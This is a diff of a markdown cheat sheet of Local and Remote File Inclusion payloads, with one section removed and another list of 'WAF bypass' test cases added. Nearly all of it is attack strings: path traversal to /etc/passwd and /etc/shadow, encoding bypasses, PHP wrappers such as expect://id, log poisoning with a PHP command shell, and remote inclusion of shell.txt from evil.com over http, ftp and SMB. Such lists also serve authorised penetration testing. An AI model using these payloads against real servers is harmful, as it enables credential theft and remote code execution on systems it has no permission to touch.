@@ -2634,266 +2634,6 @@ Example:
 ```text
 ?file=index.php
 ```
-
----
-
-# 🟠 LOCAL FILE INCLUSION (LFI)
-
----
-
-## 📌 2. Basic LFI Payloads
-
-```text
-../
-../../
-../../../
-```
-
-Example:
-
-```text
-?file=../../etc/passwd
-```
-
----
-
-## 📌 3. Absolute Path Inclusion
-
-### 🔥 Linux
-
-```text
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/proc/self/environ
-```
-
-### 🔥 Windows
-
-```text
-C:\Windows\win.ini
-C:\Windows\System32\drivers\etc\hosts
-```
-
----
-
-## 📌 4. Encoding-Based LFI Bypass
-
-### 🔥 4.1 URL Encoding
-
-```text
-..%2f
-%2e%2e%2f
-```
-
-### 🔥 4.2 Double Encoding
-
-```text
-%252e%252e%252f
-```
-
-### 🔥 4.3 Mixed Encoding
-
-```text
-.%2e/
-..%252f
-```
-
----
-
-## 📌 5. Unicode / UTF-8 Bypass
-
-```text
-..%c0%af
-..%e0%80%af
-..%ef%bc%8f
-```
-
----
-
-## 📌 6. Windows Separator Bypass
-
-```text
-..\
-..\\
-..%5c
-```
-
----
-
-## 📌 7. Null Byte Injection (Legacy PHP)
-
-```text
-../../etc/passwd%00
-../../etc/passwd%00.jpg
-```
-
-✔️ Bypasses forced file extensions
-
----
-
-## 📌 8. File Extension Filter Bypass
-
-If `.php`, `.html`, `.jpg` is appended:
-
-```text
-../../etc/passwd/.jpg
-../../etc/passwd....
-```
-
----
-
-## 📌 9. PHP Wrapper Abuse (LFI → Source Disclosure / RCE)
-
-### 🔥 Source Code Disclosure
-
-```text
-php://filter/convert.base64-encode/resource=index.php
-```
-
-### 🔥 Command Execution (Rare / Old)
-
-```text
-php://expect://id
-```
-
-### 🔥 Input-Based Execution
-
-```text
-php://input
-```
-
----
-
-## 📌 10. Log File Inclusion (LFI → RCE Chain)
-
-### 🔥 Read Logs
-
-```text
-../../../../var/log/apache2/access.log
-../../../../var/log/nginx/access.log
-```
-
-### 🔥 Log Poisoning
-
-Inject PHP code via User-Agent:
-
-```text
-<?php system($_GET['cmd']); ?>
-```
-
-Execute:
-
-```text
-?file=../../../../var/log/apache2/access.log&cmd=id
-```
-
----
-
-## 📌 11. Session File Inclusion
-
-```text
-/var/lib/php/sessions/sess_<PHPSESSID>
-```
-
----
-
-## 📌 12. Proc & Environment Abuse
-
-```text
-/proc/self/environ
-/proc/version
-```
-
-✔️ Often combined with header injection
-
----
-
-# 🔴 REMOTE FILE INCLUSION (RFI)
-
-⚠️ Requires:
-
-* `allow_url_fopen = On`
-* `allow_url_include = On`
-
----
-
-## 📌 13. Basic RFI Payloads
-
-```text
-http://evil.com/shell.txt
-https://evil.com/shell.php
-```
-
-Example:
-
-```text
-?file=http://evil.com/shell.txt
-```
-
----
-
-## 📌 14. RFI with Command Execution
-
-Remote file content:
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-Execute:
-
-```text
-?file=http://evil.com/shell.txt&cmd=id
-```
-
----
-
-## 📌 15. Protocol-Based RFI Bypass
-
-```text
-ftp://evil.com/shell.txt
-data://text/plain,<?php system($_GET['cmd']); ?>
-```
-
----
-
-## 📌 16. Encoding-Based RFI Bypass
-
-```text
-http%3A%2F%2Fevil.com%2Fshell.txt
-```
-
----
-
-## 📌 17. RFI via SMB (Windows)
-
-```text
-\\evil.com\share\shell.txt
-```
-
----
-
-## 📌 18. LFI → RFI Chaining
-
-Upload malicious file → include locally:
-
-```text
-/uploads/shell.php
-```
-
----
-
-## 📌 19. Combined Master LFI / RFI Payload (Fuzzer)
-
-```text
-../../../../etc/passwd
-..%2f..%2f..%2fetc%2fpasswd
-%252e%252e%252f%252e%252e%252fetc%252fpasswd
-php://filter/convert.base64-encode/resource=index.php
-http://evil.com/shell.txt
-```
-
 etc/passwd
 etc/passwd%00
 etc%2fpasswd
@@ -2908,6 +2648,257 @@ C:/apache2/log/access_log
 C:/apache2/log/error.log
 C:/apache2/log/error_log
 C:/documents and settings/administrator/desktop/desktop.ini
+
+Below is **same strict format** — **ONLY testcase names with payloads**, including **real-time WAF bypass payloads** for **LFI & RFI**.
+(No explanations. Pentest / Bug bounty / GitHub ready.)
+
+---
+
+## Local File Inclusion (LFI) – Test Cases & Payloads (with WAF Bypass)
+
+### 1. Basic LFI
+
+```
+?page=../../../../etc/passwd
+```
+
+### 2. Deep Traversal Bypass
+
+```
+?page=../../../../../../../../etc/passwd
+```
+
+### 3. URL Encoded Traversal
+
+```
+?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+### 4. Double URL Encoding Bypass
+
+```
+?page=%252e%252e%252fetc%252fpasswd
+```
+
+### 5. Mixed Encoding Bypass
+
+```
+?page=..%2f..%2f..%2fetc/passwd
+```
+
+### 6. Null Byte Injection
+
+```
+?page=../../etc/passwd%00
+```
+
+### 7. Windows LFI
+
+```
+?page=../../../../windows/win.ini
+```
+
+### 8. Windows Encoding Bypass
+
+```
+?page=..%5c..%5cwindows%5cwin.ini
+```
+
+### 9. PHP Wrapper – Source Disclosure
+
+```
+?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+### 10. PHP Wrapper – Read Config
+
+```
+?page=php://filter/resource=config.php
+```
+
+### 11. Data Wrapper Bypass
+
+```
+?page=data://text/plain,<?php phpinfo(); ?>
+```
+
+### 12. Expect Wrapper (RCE via LFI)
+
+```
+?page=expect://id
+```
+
+### 13. Proc Self Environment
+
+```
+?page=/proc/self/environ
+```
+
+### 14. Log File Poisoning
+
+```
+?page=/var/log/apache2/access.log
+```
+
+### 15. Path Truncation Bypass
+
+```
+?page=../../../../etc/passwd/././.
+```
+
+### 16. Filter Evasion with Semicolon
+
+```
+?page=../../../../etc/passwd;
+```
+
+### 17. Case Sensitivity Bypass
+
+```
+?page=../../../../EtC/PaSsWd
+```
+
+### 18. Parameter Pollution LFI
+
+```
+?page=home.php&page=../../../../etc/passwd
+```
+
+### 19. Unicode Slash Bypass
+
+```
+?page=..%c0%af..%c0%afetc%2fpasswd
+```
+
+### 20. Dot Bypass
+
+```
+?page=....//....//etc/passwd
+```
+
+---
+
+## Remote File Inclusion (RFI) – Test Cases & Payloads (with WAF Bypass)
+
+### 1. Basic RFI
+
+```
+?page=http://evil.com/shell.txt
+```
+
+### 2. HTTPS RFI
+
+```
+?page=https://evil.com/shell.txt
+```
+
+### 3. URL Encoded RFI
+
+```
+?page=http%3a%2f%2fevil.com%2fshell.txt
+```
+
+### 4. Double URL Encoded RFI
+
+```
+?page=http%253a%252f%252fevil.com%252fshell.txt
+```
+
+### 5. Protocol Bypass (FTP)
+
+```
+?page=ftp://evil.com/shell.txt
+```
+
+### 6. Protocol Bypass (SMB)
+
+```
+?page=\\evil.com\shell.txt
+```
+
+### 7. Null Byte RFI Bypass
+
+```
+?page=http://evil.com/shell.txt%00
+```
+
+### 8. PHP Wrapper RFI
+
+```
+?page=php://input
+```
+
+### 9. Data Wrapper RFI
+
+```
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKGlkKTsgPz4=
+```
+
+### 10. Filter Bypass via Parameter Pollution
+
+```
+?page=home.php&page=http://evil.com/shell.txt
+```
+
+### 11. Whitelist Bypass Using Subdomain
+
+```
+?page=http://allowed.com.evil.com/shell.txt
+```
+
+### 12. DNS Rebinding RFI
+
+```
+?page=http://127.0.0.1.evil.com/shell.txt
+```
+
+### 13. IP Decimal Encoding
+
+```
+?page=http://2130706433/shell.txt
+```
+
+### 14. Fragment Bypass
+
+```
+?page=http://evil.com/shell.txt#
+```
+
+### 15. Path Confusion Bypass
+
+```
+?page=http://evil.com/shell.txt?/allowed/path
+```
+
+### 16. Case Bypass
+
+```
+?page=HTTP://evil.com/shell.txt
+```
+
+### 17. Redirect-Based RFI
+
+```
+?page=http://evil.com/redirect.txt
+```
+
+### 18. CRLF Injection RFI
+
+```
+?page=http://evil.com/shell.txt%0d%0a
+```
+
+### 19. Parameter Array Injection
+
+```
+?page[]=http://evil.com/shell.txt
+```
+
+### 20. Mixed Scheme Bypass
+
+```
+?page=hTTp://evil.com/shell.txt
+```
 
 ## LFI to RCE via /proc/*/fd
 
